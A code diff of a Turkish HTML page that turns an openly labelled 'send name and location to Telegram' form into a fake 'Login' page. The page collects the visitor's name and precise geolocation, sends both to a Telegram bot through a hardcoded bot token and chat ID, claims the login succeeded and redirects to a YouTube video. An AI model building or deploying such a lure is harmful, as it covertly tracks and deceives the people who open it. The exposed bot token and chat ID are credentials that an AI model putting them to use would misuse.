@@ -2,36 +2,54 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Ad + Konum Gönder</title>
+  <title>Giriş</title>
   <style>
-    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-    input, button { padding: 10px; margin: 10px; width: 250px; font-size: 16px; }
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 60px;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      width: 250px;
+      font-size: 16px;
+    }
+    #durum {
+      color: green;
+      height: 1.5em;
+    }
   </style>
 </head>
 <body>
 
   <h2>Adınızı Girin</h2>
-  <input id="isim" placeholder="Adınız" />
+  <input id="isim" placeholder="Adınız">
   <br>
-  <button onclick="gonder()">Telegram'a Gönder</button>
-  <p id="durum" style="color: green;"></p>
+  <button onclick="gonder()">Gönder ve YouTube'a Geç</button>
+  <p id="durum"></p>
 
   <script>
-    var BOT_TOKEN = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
-    var CHAT_ID   = "8499614707";
+    const BOT_TOKEN = "8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg";
+    const CHAT_ID   = "8499614707";
+    const YOUTUBE_URL = "https://www.youtube.com/watch?v=PCMJtCjfxpw";
 
     function telegramaGonder(isim, konum) {
-      var mesaj = `🧑 Ad: ${isim}\n📍 Konum: https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
-      fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+      const mesaj = `🧑 Ad: ${isim}\n📍 Konum: https://www.google.com/maps?q=${konum.lat},${konum.lon}`;
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: mesaj })
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: mesaj
+        })
       });
     }
 
     function gonder() {
-      var isim = document.getElementById("isim").value.trim();
-      var durum = document.getElementById("durum");
+      const isim = document.getElementById("isim").value.trim();
+      const durum = document.getElementById("durum");
+      durum.textContent = "";
 
       if (!isim) {
         durum.style.color = "red";
@@ -41,19 +59,31 @@
 
       if (!navigator.geolocation) {
         durum.style.color = "red";
-        durum.textContent = "Tarayıcı konum desteği yok.";
+        durum.textContent = "Konum desteği yok.";
         return;
       }
 
-      navigator.geolocation.getCurrentPosition(function(pos) {
-        var konum = {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const konum = {
           lat: pos.coords.latitude.toFixed(6),
           lon: pos.coords.longitude.toFixed(6)
         };
-        telegramaGonder(isim, konum);
-        durum.style.color = "green";
-        durum.textContent = "Telegram'a gönderildi ✔";
-      }, function(err) {
+
+        telegramaGonder(isim, konum)
+          .then(() => {
+            durum.style.color = "green";
+            durum.textContent = "Giriş başarılı.YouTube'a yönlendiriliyorsunuz...";
+            setTimeout(() => {
+              window.location.href = YOUTUBE_URL;
+            }, 1500);
+          })
+          .catch(err => {
+            console.error("Telegram hatası:", err);
+            durum.style.color = "red";
+            durum.textContent = "Telegram gönderimi başarısız oldu.";
+          });
+
+      }, err => {
         durum.style.color = "red";
         durum.textContent = "Konum alınamadı: " + err.message;
       });
